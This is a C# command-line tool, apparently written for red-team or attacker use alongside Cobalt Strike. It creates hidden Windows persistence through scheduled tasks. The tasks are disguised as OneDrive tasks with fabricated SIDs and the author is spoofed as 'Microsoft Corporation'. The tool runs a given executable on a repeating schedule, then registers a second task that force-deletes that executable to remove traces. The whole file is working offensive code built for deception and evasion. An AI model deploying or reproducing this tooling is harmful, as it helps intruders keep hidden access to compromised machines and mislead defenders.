using System;
using Microsoft.Win32.TaskScheduler;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 4)
        {
            Console.WriteLine("Tasker - Scheduled task creation via COM\n");
            Console.WriteLine("Usage: tasker.exe <ExecutablePath> <WorkingDirectory> <IntervalMinutes> <MinutesUntilCleanup>");
            return;
        }

        string executablePath = args[0];
        string workingDirectory = args[1];
        double intervalMinutes;
        double MinutesUntilCleanup;

        if (!double.TryParse(args[2], out intervalMinutes))
        {
            Console.WriteLine("Invalid interval minutes. Using default value of 1 minute.");
            intervalMinutes = 1;
        }
        if (!double.TryParse(args[3], out MinutesUntilCleanup))
        {
            Console.WriteLine("Invalid Minutes to Cleanup value, using default of 5 minutes");
            MinutesUntilCleanup = 5;
        }

        using (TaskService ts = new TaskService())
        {
            {
                // Create a new task definition
                TaskDefinition td = ts.NewTask();

                //Chose some random digits for the name
                Random random = new Random();
                string ran = random.Next(100000, 999999).ToString();

                // Set task settings description
                string name1 = "OneDrive Reporting Task-S-1-5-21-3836" + ran + "-2931337074-490512365-1013";
                td.RegistrationInfo.Description = name1;

                // Set the author of the task
                td.RegistrationInfo.Author = "Microsoft Corporation";
             

                // Set the task to run under the current user's context
                td.Principal.UserId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                // ADJUST BOUNDARY AS NEEDED
                DateTime startBoundary = DateTime.Now.AddMinutes(MinutesUntilCleanup);
                TimeTrigger trigger = new TimeTrigger
                {
                    EndBoundary = startBoundary,  // Set EndBoundary to the same as StartBoundary
                    Repetition = new RepetitionPattern(TimeSpan.FromMinutes(intervalMinutes), TimeSpan.Zero)
                };
                td.Triggers.Add(trigger);

                // Create an action that launches the specified executable
                ExecAction action = new ExecAction(executablePath);
                td.Actions.Add(action);

                // Set the working directory for the action
                action.WorkingDirectory = workingDirectory;

                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.DisallowStartIfOnBatteries = false;

                // Register the task
                ts.RootFolder.RegisterTaskDefinition(name1, td);

                Console.WriteLine("Persistence Task created successfully.");

                TaskDefinition deleteTd = ts.NewTask();
                Random random2 = new Random();
                string ran2 = random.Next(100000, 999999).ToString();

                string name2 = "OneDrive Standalone Update Task-S-1-5-21-3831337620-" + ran2 + "9074-490512365-1001";
                deleteTd.RegistrationInfo.Description = name2;
                deleteTd.RegistrationInfo.Author = "Microsoft Corporation";
                deleteTd.Principal.UserId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                deleteTd.Settings.StopIfGoingOnBatteries = false;
                deleteTd.Settings.DisallowStartIfOnBatteries = false;

                // Trigger
                deleteTd.Triggers.Add(new TimeTrigger
                {
                    //ADJUST BOUNDARY AS NEEDED
                    StartBoundary = DateTime.Now.AddMinutes(MinutesUntilCleanup),
                    Repetition = new RepetitionPattern(TimeSpan.FromMinutes(intervalMinutes), TimeSpan.Zero)
                });

                // Create an action that invokes cmd.exe with the delete command as arguments, will always work on the current executable used in aggressor
                string deleteCommand = $"/c del /f /A /q \"{System.IO.Path.Combine(workingDirectory, executablePath)}\"";

                ExecAction deleteAction = new ExecAction("cmd.exe", deleteCommand, null);
                deleteTd.Actions.Add(deleteAction);

                // Register the delete task
                ts.RootFolder.RegisterTaskDefinition(name2, deleteTd);

                Console.WriteLine("Cleanup task created successfully.");
            }
        }

    }
}
